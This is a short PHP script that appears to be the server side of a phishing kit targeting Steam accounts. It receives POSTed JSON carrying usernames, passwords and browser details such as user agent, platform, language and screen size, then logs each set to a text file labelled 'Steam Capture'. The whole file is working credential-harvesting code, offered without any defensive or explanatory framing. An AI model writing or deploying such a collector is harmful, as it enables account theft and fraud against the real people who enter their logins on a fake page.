<?php
$result_file = "result.txt";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = file_get_contents('php://input');
    $credentials = json_decode($data, true);
    
    if ($credentials) {
        $timestamp = date('Y-m-d H:i:s');
        $log = "=== Steam Capture ===\n";
        $log .= "Timestamp: $timestamp\n";
        $log .= "Type: " . ($credentials['type'] ?? 'unknown') . "\n";
        $log .= "Username: " . ($credentials['username'] ?? 'N/A') . "\n";
        $log .= "Password: " . ($credentials['password'] ?? 'N/A') . "\n";
        $log .= "User Agent: " . ($credentials['userAgent'] ?? 'N/A') . "\n";
        $log .= "Platform: " . ($credentials['platform'] ?? 'N/A') . "\n";
        $log .= "Language: " . ($credentials['language'] ?? 'N/A') . "\n";
        $log .= "Screen: " . ($credentials['screen'] ?? 'N/A') . "\n";
        $log .= "\n" . str_repeat("=", 50) . "\n\n";
        
        file_put_contents($result_file, $log, FILE_APPEND);
    }
}
?>
